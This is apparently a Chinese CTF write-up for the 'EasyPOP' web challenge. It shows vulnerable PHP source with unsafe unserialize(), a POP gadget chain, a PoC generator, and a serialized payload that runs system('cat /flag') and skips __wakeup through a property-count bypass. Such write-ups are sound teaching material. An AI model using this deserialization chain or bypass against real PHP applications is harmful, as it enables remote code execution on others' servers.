---
title: DASCTF X GFCTF 2022十月挑战赛
date: 2022-11-02 22:17:22
excerpt: DASCTF X GFCTF 2022十月挑战赛
categories: 复现
---



# DASCTF X GFCTF 2022十月挑战赛！

## 

## WEB



### 1.EasyPOP

源码：

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);

class fine
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this->cmd = $cmd;
        $this->content = $content;
    }

    public function __invoke()
    {
        call_user_func($this->cmd, $this->content);
    }

    public function __wakeup()
    {
        $this->cmd = "";
        die("Go listen to Jay Chou's secret-code! Really nice");
    }
}

class show
{
    public $ctf;
    public $time = "Two and a half years";

    public function __construct($ctf)
    {
        $this->ctf = $ctf;
    }


    public function __toString()
    {
        return $this->ctf->show();
    }

    public function show(): string
    {
        return $this->ctf . ": Duration of practice: " . $this->time;
    }


}

class sorry
{
    private $name;
    private $password;
    public $hint = "hint is depend on you";
    public $key;

    public function __construct($name, $password)
    {
        $this->name = $name;
        $this->password = $password;
    }

    public function __sleep()
    {
        $this->hint = new secret_code();
    }

    public function __get($name)
    {
        $name = $this->key;
        $name();
    }


    public function __destruct()
    {
        if ($this->password == $this->name) {

            echo $this->hint;
        } else if ($this->name = "jay") {
            secret_code::secret();
        } else {
            echo "This is our code";
        }
    }


    public function getPassword()
    {
        return $this->password;
    }

    public function setPassword($password): void
    {
        $this->password = $password;
    }


}

class secret_code
{
    protected $code;

    public static function secret()
    {
        include_once "hint.php";
        hint();
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this->$num();
    }

    private function show()
    {
        return $this->code->secret;
    }
}


if (isset($_GET['pop'])) {
    $a = unserialize($_GET['pop']);
    $a->setPassword(md5(mt_rand()));
} else {
    $a = new show("Ctfer");
    echo $a->show();
}
Ctfer: Duration of practice: Two and a half years
```

最终利用点是`fine::invoke`

`$a = unserialize($_GET['pop']);`这里告诉我们是**反序列化**的题目，构造**pop链**



```
fine::__invoke() <- sorry::__get() <- secret_code::show() <- secret_code::__call() <- show::__toString() <- sorry::__destruct() 

```





**poc**

```
<?php
class fine
{
    public $cmd;
    public $content;
}
class secret_code
{
    public $code;
}

class show
{
    public $ctf;
    public $time;
}


class sorry
{
    public $name;
    public $password;
    public $hint;
    public $key;
}

$sorry = new sorry();
$sorry2 = new sorry();
$show = new show();
$secret_code = new secret_code();
$fine = new fine();
$sorry->hint = $show;
$show->ctf = $secret_code;
$secret_code->code = $sorry2;
$sorry2->key = $fine;
$fine->cmd = 'system';
$fine->content = 'cat /flag';
echo serialize($sorry);
?>
//绕过wakeup
//?pop=O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";O:4:"show":2:{s:3:"ctf";O:11:"secret_code":1:{s:4:"code";O:5:"sorry":4:{s:4:"name";N;s:8:"password";N;s:4:"hint";N;s:3:"key";O:4:"fine":3:{s:3:"cmd";s:6:"system";s:7:"content";s:9:"cat /flag";}}}s:4:"time";N;}s:3:"key";N;}

```